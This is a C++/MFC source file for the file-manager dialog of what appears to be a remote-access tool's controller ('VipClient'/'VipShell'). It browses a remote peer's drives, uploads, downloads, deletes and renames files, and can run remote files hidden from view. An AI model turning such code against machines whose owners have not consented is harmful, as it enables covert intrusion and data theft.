// FileManageDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "VipClient.h"
#include "FileManageDlg.h"
#include ".\filemanagedlg.h"
#include "VipClient.h"


// CFileManageDlg 对话框

IMPLEMENT_DYNAMIC(CFileManageDlg, CDialog)
CFileManageDlg::CFileManageDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CFileManageDlg::IDD, pParent)
{
	 m_bIsClose = false;
	 m_hThread = NULL;
}

CFileManageDlg::~CFileManageDlg()
{
}

void CFileManageDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_FILE, m_ListFile);
	DDX_Control(pDX, IDC_COMBO_FILEPATH, m_ComBoxFilePath);
}


BEGIN_MESSAGE_MAP(CFileManageDlg, CDialog)
	ON_BN_CLICKED(IDOK, OnBnClickedOk)
	ON_WM_SIZE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_FILE, OnNMDblclkListFile)
	ON_COMMAND(ID_FILE_SHOW, OnFileShow)
	ON_COMMAND(ID_FILE_HIDE, OnFileHide)
	ON_COMMAND(ID_FILE_MOVE, OnFileMove)
	ON_COMMAND(ID_FILE_DEL, OnFileDel)
	ON_COMMAND(ID_FILE_DOWN, OnFileDown)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_FILE, OnLvnEndlabeleditListFile)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_FILE, OnNMRclickListFile)
	ON_WM_DROPFILES()
	ON_NOTIFY(HDN_ITEMCLICK, 0, OnHdnItemclickListFile)
	ON_COMMAND(ID_FILE_RUNAT, OnFileRunat)
END_MESSAGE_MAP()


// CFileManageDlg 消息处理程序


DWORD WINAPI ThreadDoWork(LPVOID lp)
{
	CFileManageDlg* pThis = (CFileManageDlg*)lp;
	pThis->__OnDoWork();
	return 0;
}
void CFileManageDlg::Layout()
{
	if(m_ListFile.GetSafeHwnd() == NULL)
		return ;
	CRect rcWnd; GetClientRect(&rcWnd);

	CRect rcFilePath;
	m_ComBoxFilePath.GetClientRect(&rcFilePath);
	rcFilePath.right = rcWnd.Width() - 120;
	m_ComBoxFilePath.MoveWindow(&rcFilePath);

	CRect rcList; rcList = rcWnd;
	rcList.top = rcFilePath.Height();
//	rcList.right -= 120;
	rcList.bottom = rcWnd.Height() - 25;
	m_ListFile.MoveWindow(&rcList);
	CRect rcButtonOK; GetDlgItem(IDOK)->GetClientRect(&rcButtonOK);
	GetDlgItem(IDOK)->MoveWindow(rcWnd.right - 100, 0,  rcButtonOK.Width(), rcButtonOK.Height());
	CRect rcStatus; rcStatus = rcWnd;
	rcStatus.top = rcStatus.bottom - 25;
	m_wndStatusBar.MoveWindow(&rcStatus);

}
void CFileManageDlg::__InitWorkVec()
{
	m_DownFileVec.clear();
	m_UpFileVec.clear();
	m_DownDirVec.clear();
	m_UpDirVec.clear();
}
void CFileManageDlg::__OnDoWork()
{
	m_ListFile.EnableWindow(FALSE);
	GetDlgItem(IDOK)->EnableWindow(FALSE);
	for(DWORD i = 0; i < m_DownFileVec.size(); i ++)
	{
		m_hServer.DowndFile(m_DownFileVec[i].strP, m_DownFileVec[i].strR);
		if(m_bIsClose)
			return ;
	}
	for(DWORD i = 0; i < m_UpFileVec.size(); i ++)
	{
		m_hServer.UpFile(m_UpFileVec[i].strP, m_UpFileVec[i].strR);
		if(m_bIsClose)
			return ;
	}
	for(DWORD i = 0; i < m_DownDirVec.size(); i ++)
	{
		m_hServer.DowndFileDir(m_DownDirVec[i].strP, m_DownDirVec[i].strR);
		if(m_bIsClose)
			return ;
	}
	for(DWORD i = 0; i < m_UpDirVec.size(); i ++)
	{
		m_hServer.UpFileDir(m_UpDirVec[i].strP, m_UpDirVec[i].strR);
		if(m_bIsClose)
			return ;
	}
	m_ListFile.EnableWindow();
	GetDlgItem(IDOK)->EnableWindow();
	__OnGetFileInfo(GetCurrentPath());
}
void CFileManageDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	CString strPath;
	m_ComBoxFilePath.GetWindowText(strPath);
	if( strPath == GetCurrentPath() )
		return ;
	if(strPath.GetLength() != 0)
		__OnGetFileInfo(strPath);
	else
		__OnGetRoot();

	//__OnGetRoot();
}

void CFileManageDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	Layout();
}

BOOL CFileManageDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化

	m_hServer.SetCallBack(this);
	m_ListFile.InsertColumn(0, L"名称", LVCFMT_LEFT, 300);
	m_ListFile.InsertColumn(1, L"大小", LVCFMT_LEFT, 100);
	m_ListFile.InsertColumn(2, L"修改时间", LVCFMT_LEFT, 200);

	WCHAR szIp[100] =L"";
	DWORD dwPort = m_hServer.GetPeer(szIp);
	CString strS; strS.Format(L"%s:%d", szIp, dwPort);
	strS += L"文件管理";
	SetWindowText(strS);

	m_ListFile.DragAcceptFiles();
	m_wndStatusBar.Create(WS_CHILD | WS_BORDER | WS_VISIBLE ,CRect(1, 1, 1, 1),this, 0x154);
//	DragAcceptFiles();
	CRect rc;
	GetWindowRect(&rc);
	rc.right = rc.left + 800;
	rc.bottom = rc.top + 600;
	MoveWindow(&rc);
	Layout();
	__InitImgList();
	__OnGetRoot();


	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CFileManageDlg::OnDownFileIng(LPCTSTR szPath, LPCTSTR szRemote, DWORD dwBig, DWORD dwLen, DWORD dwSTime)
{
	CString strText, strP, strR;
	DWORD dwEndTime = GetTickCount();
	DWORD dwTime = dwEndTime - dwSTime;
	if(dwTime == 0)
		return ;
	DWORD dwDown = dwLen  / dwTime * 1000 ;
	DWORD dwRTime = (dwBig - dwLen) / (dwLen  / dwTime) / 1000;
	strText.Format(_T("下载文件:%s  文件大小:%s  已经下载:%s 速度:%s/秒 剩余%s "), _GetNameByPath(szRemote), __MakeFileSizeString(dwBig), __MakeFileSizeString(dwLen), __MakeFileSizeString(dwDown), __MakeTimeString(dwRTime));
	m_wndStatusBar.SetWindowText(strText);
}
void CFileManageDlg::OnUpFileIng(LPCTSTR szPath, LPCTSTR szRemote, DWORD dwBig, DWORD dwLen, DWORD dwSTime)
{
	CString strText, strP, strR;
	DWORD dwEndTime = GetTickCount();
	DWORD dwTime = dwEndTime - dwSTime;
	if(dwTime == 0)
		return ;
	DWORD dwDown = dwLen  / dwTime * 1000 ;
	DWORD dwRTime = (dwBig - dwLen) / (dwLen  / dwTime) / 1000;
	strText.Format(_T("上传文件:%s  文件大小:%s  已经上传:%s 速度:%s/秒 剩余%s "), _GetNameByPath(szRemote), __MakeFileSizeString(dwBig), __MakeFileSizeString(dwLen), __MakeFileSizeString(dwDown),  __MakeTimeString(dwRTime));
	m_wndStatusBar.SetWindowText(strText);
}
DWORD CFileManageDlg::_GetFileImg(LPCTSTR sz)
{
	CString strType;
	CString strT = sz;/*GetCurrentPath();*/
	TCHAR sPath[MAX_PATH] = {0};
	lstrcpy(sPath, strT);
	if(_tcsrchr(sPath, _T('.')) != NULL)
		strType  =	_tcsrchr(sPath, _T('.'));
	else
		strType = sPath;
	if(strType[0] != _T('.'))
		strType = sz;
	if( strType.CompareNoCase(L".exe") == 0 )
		return _GetFileImg(L"__exe");
	if( strType.CompareNoCase(L".sys") == 0 )
		strType = L".dll";
	for (UINT i = 0; i < m_strFileType.size(); i++) 
	{
		CString strT = m_strFileType[i];
		if(strType.CompareNoCase(m_strFileType[i]) ==0)
			return i;
	}
	HICON hIcon = __FindFileType(strType);
	if ( hIcon )
	{
		_AddImgFileType(hIcon, strType);
		return _GetFileImg(sz);
	}
	return 0;
}
HICON CFileManageDlg::__FindFileType(LPCTSTR szType)
{
	CString strRet;
	LPCTSTR szKey = szType;
	if(lstrlen(szKey) == 0)
		return NULL;
	HKEY  HKEYFileType;
	long ret;
	CString strFileType = szKey;
	ret = RegOpenKeyEx(HKEY_CLASSES_ROOT, szKey, 0, KEY_READ, &HKEYFileType);
	if(ret != ERROR_SUCCESS)
	{ 
		RegCloseKey(HKEYFileType);
		return NULL;
	}
	DWORD dwType = REG_SZ;
	TCHAR szVel[256] = {0};
	DWORD dwLen = 256;
	RegQueryValueEx(HKEYFileType, NULL, NULL, &dwType, (BYTE*)szVel, &dwLen);
	RegCloseKey(HKEYFileType);
	strRet = szVel;
	if(strRet.GetLength() == 0)
		return NULL;
	{{
		CString strFileType ; strFileType.Format(_T("%s\\DefaultIcon"), strRet);
		ret = RegOpenKeyEx(HKEY_CLASSES_ROOT, strFileType, 0, KEY_READ, &HKEYFileType);
		if(ret != ERROR_SUCCESS)
		{ 
			RegCloseKey(HKEYFileType);
			return NULL;
		}
		DWORD dwType = REG_SZ;
		TCHAR szVel[256] = {0};
		DWORD dwLen = 256;
		RegQueryValueEx(HKEYFileType, NULL, NULL, &dwType, (BYTE*)szVel, &dwLen);
		RegCloseKey(HKEYFileType);
		CString strIcoPath = szVel;
		CString strFile;
		int nFind = strIcoPath.Find(_T(","));
		DWORD dwIndex = 0;
		if(nFind == -1)
		{
			strFile = strIcoPath;

		}
		else
		{
			strFile = strIcoPath.Left(nFind);
			CString strIndex = strIcoPath.Mid(nFind + 1);
			LPCTSTR szIndex = strIndex.GetString() ;
			for(DWORD i = 0; i < (DWORD)strIndex.GetLength(); i++)
			{
				
				if(_tstoi(szIndex) != 0)
				{
					dwIndex = _tstoi(szIndex);
					break;
				}
				szIndex ++;
			}
		}
		return ExtractIcon(NULL, strFile, dwIndex );
	}}

	return NULL;
}
void CFileManageDlg::_AddImgFileType(HICON hIcon, LPCTSTR strFile)
{
	m_FileImgList.Add(hIcon);
	m_strFileType.push_back(strFile);
}
void CFileManageDlg::_AddImgFileType(UINT dwImgFile, LPCTSTR strFile)
{
	HICON hIcon =theApp.LoadIcon(dwImgFile);
	_AddImgFileType(hIcon, strFile);
}
void CFileManageDlg::__InitImgList()
{
	m_FileImgList.Create(16, 16, TRUE | ILC_COLOR32 , 1000, 0);
	_AddImgFileType(IDI_ICON_NOTHING, L"__Nothing");
	_AddImgFileType(IDI_ICON_FLOPPY, L"__floppy");
	_AddImgFileType(IDI_ICON_EXE, L"__exe");
	_AddImgFileType(IDI_ICON_DISK, L"__disk");
	_AddImgFileType(IDI_ICON_DIR, L"__dir");
	_AddImgFileType(IDI_ICON_CD, L"__cd");
	m_ListFile.SetImageList(&m_FileImgList, LVSIL_SMALL);
}
bool CFileManageDlg::IsRoot()
{
	CString	strText = m_ListFile.GetItemText(0, 0);
	if( strText[0] == _T('.'))
		return false;
	return true;
}
void CFileManageDlg::__OnGetRoot()
{
	m_ListFile.DeleteAllItems();
	CServerFileManageHandle::File_Root_Vector vectorRoot;
	bool bIsOK = m_hServer.GetRoot(&vectorRoot);
	if(bIsOK)
	{
		DWORD dwCount;
		for(DWORD i = 0 ; i < vectorRoot.size(); i++)
		{
			DWORD dwType;
			dwCount = m_ListFile.GetItemCount();
			if(DRIVE_CDROM == vectorRoot[i].dwType)
				dwType = _GetFileImg(L"__cd");
			else if(DRIVE_FIXED == vectorRoot[i].dwType)
				dwType = _GetFileImg(L"__disk");
			else 
				dwType = _GetFileImg(L"__floppy");
			int nRet = m_ListFile.InsertItem(dwCount, vectorRoot[i].szName, dwType);
			CString strDeskLen; strDeskLen.Format(L"%4.1f/%4.1fG", (float) vectorRoot[i].ullcanusebyte / 1024 / 1024 / 1024 , (float)vectorRoot[i].ulltotalspace / 1024 /1024/ 1024);
			m_ListFile.SetItemText(nRet, 1, strDeskLen);
		}
	}
}
CString CFileManageDlg::__MakeTimeString(DWORD dwTime)
{
	CString strRet;
	if ( dwTime < 60)
		strRet.Format(_T("%d秒"), dwTime);
	else if (dwTime < 60 * 60)
		strRet.Format(_T("%d分钟"), dwTime / 60);
	else if (dwTime < 60 * 60 * 24)
		strRet.Format(_T("%d小时"), dwTime / 60 / 60);
	else 
		strRet.Format(_T("%d天"), dwTime / 60 / 60 / 24);
	return strRet;
}
CString CFileManageDlg::__MakeFileSizeString(DWORD dwSize)
{
	CString strRet;
	if(dwSize < 1024)
		strRet.Format(L"%d字节", dwSize);
	else if (dwSize > 1024 && dwSize < 1024 * 1024)
		strRet.Format(L"%4.2f K", (float)dwSize / 1024);
	else if(dwSize > 1024 * 1024 && dwSize < 1024 * 1024 * 1024)
		strRet.Format(L"%4.2f M", (float)dwSize / 1024 / 1024);
	else
		strRet.Format(L"%4.2f G", (float)dwSize / 1024 / 1024 / 1024);
	return strRet;
}
CString CFileManageDlg::__MakeFileTimeString(FILETIME& fileTime)
{
	SYSTEMTIME systime;
	FileTimeToSystemTime(&fileTime, &systime);
	CString strTime;
	strTime.Format(_T("%d-%d-%d %d:%d:%02d"), systime.wYear, systime.wMonth, systime.wDay, systime.wHour, systime.wMinute, systime.wSecond);
	return strTime;
}
void CFileManageDlg::__OnGetFileInfo(LPCTSTR szPath)
{
	m_ListFile.DeleteAllItems();
	CServerFileManageHandle::File_Info_Vector vectorFile;
	bool bIsOK = m_hServer.GetFileInfo(szPath, &vectorFile);
	m_FileInfo.clear();
	if(bIsOK)
	{
		DWORD dwCount;
		int nRetAdd;
		DWORD dwVecCount;
		CString strText;
		for(DWORD i = 0 ; i < vectorFile.size(); i++)
		{
			if(vectorFile[i].cFileName[0] == _T('.') )
				continue;
			dwCount = m_ListFile.GetItemCount();
			if(!vectorFile[i].bIsDir)
				nRetAdd = m_ListFile.InsertItem(dwCount, vectorFile[i].cFileName, _GetFileImg(vectorFile[i].cFileName));
			else
				nRetAdd = m_ListFile.InsertItem(dwCount, vectorFile[i].cFileName, _GetFileImg(L"__dir"));
			if(!vectorFile[i].bIsDir)
				m_ListFile.SetItemText(nRetAdd, 1, __MakeFileSizeString(vectorFile[i].dwFileSize ));
			m_ListFile.SetItemText(nRetAdd, 2, __MakeFileTimeString(vectorFile[i].ftLastWriteTime ));
			m_FileInfo.push_back(vectorFile[i]);
			dwVecCount = m_FileInfo.size() - 1;
			m_ListFile.SetItemData(nRetAdd, dwVecCount);
		}
	}
	m_ListFile.InsertItem(0, L"..向上", _GetFileImg(L"__dir"));
	m_ComBoxFilePath.SetWindowText(szPath);
	SetCurrentPath(szPath);
}
CString CFileManageDlg::GetCurrentUpPath(LPCTSTR str)
{
	CString strT = str;/*GetCurrentPath();*/
	TCHAR sPath[MAX_PATH] = {0};
	lstrcpy(sPath, strT);
	if(sPath[lstrlen(sPath) -1] == _T('\\'))
		sPath[lstrlen(sPath) -1] = 0;
	*(_tcsrchr(sPath, _T('\\')) +1) = 0;
	strT = sPath;
	return strT;
}
CString CFileManageDlg::GetCurrentPath()
{
	return m_strCurrentPath;
}
void CFileManageDlg::SetCurrentPath(LPCTSTR sz)
{
	m_strCurrentPath = sz;
	if(m_strCurrentPath[m_strCurrentPath.GetLength() -1] != _T('\\'))
		m_strCurrentPath += _T("\\");
}
CString CFileManageDlg::__GetFileNameByIndex(DWORD dwIndex)
{
	CString strPath;
	tagVipShellFileInfo* pFileInfo = __GetFileInfoByIndex(dwIndex);
	if(!pFileInfo)
		return strPath;
	strPath = GetCurrentPath();
	strPath += pFileInfo->cFileName;
	return strPath;
}
DWORD CFileManageDlg::_GetSelItemToVector(std::vector<DWORD>* pVector)
{
	pVector->clear();
	POSITION posti = m_ListFile.GetFirstSelectedItemPosition();
	if(posti == NULL)
		return -1;
	while(posti)
	{
		DWORD dwSel = m_ListFile.GetNextSelectedItem(posti);
		pVector->push_back(dwSel);
	}

	return pVector->size();
}
DWORD CFileManageDlg::_GetSelItem()
{
	POSITION posti = m_ListFile.GetFirstSelectedItemPosition();
	if(posti == NULL)
		return -1;
	DWORD dwSel = m_ListFile.GetNextSelectedItem(posti);
	return dwSel;
}
tagVipShellFileInfo* CFileManageDlg::__GetFileInfoByIndex(DWORD dwIndex)
{
	if( (DWORD)m_ListFile.GetItemCount()-1 < dwIndex )
		return NULL;
	return &m_FileInfo[m_ListFile.GetItemData(dwIndex)];
}
void CFileManageDlg::OnNMDblclkListFile(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
	DWORD dwSel = _GetSelItem();
	if(dwSel == -1)
		return ;
	CString strFileName = m_ListFile.GetItemText(dwSel, 0);
	if( IsRoot() )
		return __OnGetFileInfo(strFileName);
	if(dwSel != 0)
	{
		tagVipShellFileInfo* pFileInfo = __GetFileInfoByIndex(dwSel);
		if(!pFileInfo)
			return ;
		if(pFileInfo->bIsDir)
		{
			CString strPath = GetCurrentPath();
			strPath += pFileInfo->cFileName;
			__OnGetFileInfo(strPath);
		}
	}
	else
	{
	//按下向上
		if(GetCurrentPath().GetLength() < 4)
			__OnGetRoot();
		else
		{
			CString strUp = GetCurrentUpPath(GetCurrentPath());
			__OnGetFileInfo(strUp);
		}
	}
	
}

void CFileManageDlg::OnFileShow()
{
	// TODO: 在此添加命令处理程序代码
	
	DWORD dwSel = _GetSelItem();
	if(dwSel == -1)
		return ;
	CString strPath = __GetFileNameByIndex(dwSel);
	TCHAR szPathDir[MAX_PATH] = {0};
	lstrcpy(szPathDir, strPath);
	*(_tcsrchr(szPathDir, _T('\\')) +1) = 0;
	bool bIsOk = m_hServer.RunFile(strPath, szPathDir, SW_SHOW);
}

void CFileManageDlg::OnFileHide()
{
	// TODO: 在此添加命令处理程序代码
	DWORD dwSel = _GetSelItem();
	if(dwSel == -1)
		return ;
	CString strPath = __GetFileNameByIndex(dwSel);
	TCHAR szPathDir[MAX_PATH] = {0};
	lstrcpy(szPathDir, strPath);
	*(_tcsrchr(szPathDir, _T('\\')) +1) = 0;
	bool bIsOk = m_hServer.RunFile(strPath, szPathDir, SW_HIDE);
}

void CFileManageDlg::OnFileMove()
{
	// TODO: 在此添加命令处理程序代码
	if(_GetSelItem() != -1)
		m_ListFile.EditLabel(_GetSelItem());
}

void CFileManageDlg::OnFileDel()
{
	// TODO: 在此添加命令处理程序代码
	std::vector<DWORD> vecTorDwrd;
	DWORD dwRSel = _GetSelItemToVector(&vecTorDwrd);
	if(dwRSel == -1 || dwRSel == 0)
		return ;
	for(DWORD i = 0; i < vecTorDwrd.size(); i++)
	{
		DWORD dwSel = vecTorDwrd[i];
		CString strPath = __GetFileNameByIndex(dwSel);
		bool bIsOk = m_hServer.DelFile(strPath);
		if(bIsOk)
			m_ListFile.DeleteItem(dwSel);
	}

}

BOOL CFileManageDlg::SelectSaveFilePath(CString& strPath)
{
	    strPath = _T("");
		TCHAR szDir[MAX_PATH];
		BROWSEINFO bi; 
		ITEMIDLIST *pidl; 

		bi.hwndOwner=NULL; 
		bi.pidlRoot=NULL; 
		bi.pszDisplayName=NULL; 
		bi.lpszTitle=_T("选择文件路径"); 
		bi.ulFlags=BIF_RETURNONLYFSDIRS ; 
		bi.lpfn=NULL; 
		bi.lParam=0; 
		bi.iImage=0; 

		pidl=SHBrowseForFolder(&bi);

		if(!SHGetPathFromIDList(pidl,szDir))
		{
			return FALSE;
		}
		if(szDir[lstrlen(szDir) - 1] != L'\\')
			lstrcat(szDir, L"\\");
		strPath = szDir;
		return TRUE;
}
void CFileManageDlg::__SatrtWork()
{
	m_hThread = CreateThread(NULL, 0, ThreadDoWork, this, 0, NULL);
}
void CFileManageDlg::OnFileDown()
{
	// TODO: 在此添加命令处理程序代码
	__InitWorkVec();
	std::vector<DWORD> vecTorDwrd;
	DWORD dwRSel = _GetSelItemToVector(&vecTorDwrd);
	if(dwRSel == -1 || dwRSel == 0)
		return ;
	CString strPath;
	if( !SelectSaveFilePath(strPath) )
		return ;
	for(DWORD i = 0; i < vecTorDwrd.size(); i++)
	{
		strTransmitFile file;
		DWORD dwSel = vecTorDwrd[i];
		CString strFile = __GetFileNameByIndex(dwSel);
		tagVipShellFileInfo* pFileInfo = __GetFileInfoByIndex(dwSel);
		if(!pFileInfo)
			continue;
		file.strP = strPath + m_ListFile.GetItemText(dwSel, 0);
		file.strR = strFile;
		if( !pFileInfo->bIsDir )
			m_DownFileVec.push_back(file);
		else
			m_DownDirVec.push_back(file);
	}
	__SatrtWork();
	
}

void CFileManageDlg::OnLvnEndlabeleditListFile(NMHDR *pNMHDR, LRESULT *pResult)
{
	NMLVDISPINFO *pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
	DWORD dwSel = _GetSelItem();
	if(dwSel == -1)
		return ;
	CString strFile = __GetFileNameByIndex(dwSel);
	CString strNewFile;
	m_ListFile.GetEditControl()->GetWindowText(strNewFile);
	strNewFile = GetCurrentPath() + strNewFile;
	if(strNewFile.CompareNoCase(strFile) != 0)
	{
		tagVipShellFileInfo* pFileInfo = __GetFileInfoByIndex(dwSel);
		bool bIsOk = m_hServer.MoveFile(strFile, strNewFile);
		if(!bIsOk)
		{
			//error
			m_ListFile.SetItemText(_GetSelItem(), 0, pFileInfo->cFileName);
		}
		else
		{
			CString strN ;
			m_ListFile.GetEditControl()->GetWindowText(strN);
			m_ListFile.SetItemText(_GetSelItem(), 0, strN);
			lstrcpy(pFileInfo->cFileName, strN);
		}
	}

}

void CFileManageDlg::OnNMRclickListFile(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
	DWORD dwSel = _GetSelItem();
	if( dwSel != -1)
	{
		CString strFileName = m_ListFile.GetItemText(dwSel, 0);
		if(!IsRoot())
		{
			if(dwSel != 0)
			{
				tagVipShellFileInfo* pFileInfo = __GetFileInfoByIndex(dwSel);
			//	DWORD dwFileItem = (DWORD)m_ListFile.GetItemData(dwSel);
				//if(!IsDir(m_hFileVecror[dwFileItem]))
				{
					//显示菜单
					CMenu menu;
					if (menu.LoadMenu(IDR_MENU_FILEMANAGE))
					{

						CMenu* pSubMenu = menu.GetSubMenu(0);
						if (pSubMenu) 
						{
							if( pFileInfo->bIsDir)
							{
								pSubMenu->EnableMenuItem( ID_FILE_SHOW, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
								pSubMenu->EnableMenuItem( ID_FILE_HIDE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
							//	pSubMenu->EnableMenuItem( ID_FILEMANAGE_DOWN, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);
							}
							CPoint mouse;
							GetCursorPos(&mouse);
							//	::SetForegroundWindow(m_nid.hWnd);	
							::TrackPopupMenu(pSubMenu->m_hMenu, 0, mouse.x, mouse.y, 0,
								m_hWnd, NULL);
						}

					}
				}
			}
		}
	}

}
BOOL CFileManageDlg::IsDir(LPCTSTR szFile)
{
	WIN32_FIND_DATA file;
	HANDLE hFile ;
	hFile = FindFirstFile( szFile, &file );
	if(hFile == INVALID_HANDLE_VALUE )
		return FALSE;
	BOOL bRet = IsDir(file);
	FindClose(hFile);
	return bRet;
}

BOOL CFileManageDlg::IsDir(WIN32_FIND_DATA& file)
{
	if(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		return TRUE;
	return FALSE;
}
CString CFileManageDlg::_GetNameByPath(LPCTSTR szPath)
{
	CString strName ;
	if(lstrlen(szPath) == 0)
		return strName;
	strName = ( _tcsrchr(szPath, _T('\\')) + 1);
	return strName;
}
void CFileManageDlg::OnDropFiles(HDROP hDropInfo)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	CDialog::OnDropFiles(hDropInfo);
	if(IsRoot())
		return ;
	DWORD DropCount = DragQueryFile(hDropInfo, -1, NULL, 0);
	__InitWorkVec();
	for(DWORD i = 0; i < DropCount; i++)
	{
		TCHAR szName[MAX_PATH];
		DragQueryFile(hDropInfo, i, szName, MAX_PATH);
		strTransmitFile file;

		if(!IsDir(szName))
		{
			
			CString strUp; strUp = GetCurrentPath() + _GetNameByPath(szName);
			file.strP = szName;
			file.strR = strUp;
			m_UpFileVec.push_back(file);
		}
		else
		{
			CString strUp; strUp = GetCurrentPath() + _GetNameByPath(szName); strUp += _T("\\");
			CString strName = szName; strName += _T("\\");
			file.strP = szName;
			file.strR = strUp;
			m_UpDirVec.push_back(file);
		}
	}
	__SatrtWork();

}

BOOL CFileManageDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if(pMsg->hwnd == m_ListFile.GetSafeHwnd())
	{
		if(pMsg->message == WM_DROPFILES)
		{
			OnDropFiles((HDROP)pMsg->wParam);
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CFileManageDlg::OnCancel()
{
	// TODO: 在此添加专用代码和/或调用基类
	ShowWindow(SW_HIDE);
	m_bIsClose = true;
	m_hServer.Close();
	if(m_hThread != NULL)
		WaitForSingleObject(m_hThread, 8000);

	__super::OnCancel();
}


//static 
int CALLBACK CFileManageDlg::SortCompareStringFunc(LPARAM lParam1, LPARAM lParam2, LPARAM lParamSort)
{
	CFileManageDlg* pThis = (CFileManageDlg*)lParamSort;
	int c ;
	if(pThis->m_nHeadItem == 0)
	{
		CString strItem1 = pThis->m_FileInfo[lParam1].cFileName;
		CString strItem2 = pThis->m_FileInfo[lParam2].cFileName;
		c = strItem1.CompareNoCase(strItem2);
	}else if(pThis->m_nHeadItem == 1)
	{
		c = pThis->m_FileInfo[lParam1].dwFileSize  - pThis->m_FileInfo[lParam2].dwFileSize;
	}else if( pThis->m_nHeadItem == 2)
	{
		if(pThis->m_FileInfo[lParam1].ftLastWriteTime.dwHighDateTime != pThis->m_FileInfo[lParam2].ftLastWriteTime.dwHighDateTime)
			c = pThis->m_FileInfo[lParam1].ftLastWriteTime.dwHighDateTime - pThis->m_FileInfo[lParam2].ftLastWriteTime.dwHighDateTime;
		else
			c = pThis->m_FileInfo[lParam1].ftLastWriteTime.dwLowDateTime - pThis->m_FileInfo[lParam2].ftLastWriteTime.dwLowDateTime;
	}else
		return 0;
	if(pThis->m_bCompareType)
		c = -c;
	return c;

}



void CFileManageDlg::OnHdnItemclickListFile(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMHEADER phdr = reinterpret_cast<LPNMHEADER>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	*pResult = 0;
	if(IsRoot())
		return ;
	m_nHeadItem = phdr->iItem;
	m_ListFile.DeleteItem(0);
	m_ListFile.SortItems(SortCompareStringFunc,(DWORD_PTR) this);
	m_bCompareType = !m_bCompareType;
	m_ListFile.InsertItem(0, L"..向上", _GetFileImg(L"__dir"));
}

void CFileManageDlg::OnFileRunat()
{
	// TODO: 在此添加命令处理程序代码
	std::vector<DWORD> vecTorDwrd;
	DWORD dwRSel = _GetSelItemToVector(&vecTorDwrd);
	if(dwRSel == -1 || dwRSel == 0)
		return ;
	DWORD dwSel = vecTorDwrd[0];
	CString strPath = __GetFileNameByIndex(dwSel);
	
	strTransmitFile file;
	tagVipShellFileInfo* pFileInfo = __GetFileInfoByIndex(dwSel);
	if(!pFileInfo)
		return ;
	TCHAR szTmp[256] = {0};
	GetTempPath(256, szTmp);
	if(szTmp[lstrlen(szTmp) - 1] != _T('\\') )
		lstrcat(szTmp, _T("\\"));

	file.strP = szTmp + m_ListFile.GetItemText(dwSel, 0);
	file.strR = strPath;
	if( !pFileInfo->bIsDir )
	{
		bool bIsOk = m_hServer.DowndFile(file.strP, file.strR);
		if(bIsOk)
			ShellExecute(NULL, L"open", file.strP, NULL, NULL, SW_SHOW);
	}

}
